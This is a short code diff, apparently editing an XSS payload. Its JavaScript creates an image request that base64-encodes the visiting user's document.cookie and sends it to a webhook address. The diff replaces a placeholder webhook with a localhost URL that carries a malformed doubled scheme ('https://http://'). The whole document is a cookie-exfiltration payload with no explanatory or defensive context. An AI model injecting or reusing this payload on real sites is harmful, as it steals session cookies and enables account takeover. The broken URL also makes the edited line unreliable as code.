@@ -1,2 +1,2 @@
 var i = new Image();
-i.src = "https://YOUR-WEBHOOK-URL/?c=" + btoa(document.cookie);
+i.src = "https://http://localhost:8090/?c=" + btoa(document.cookie);
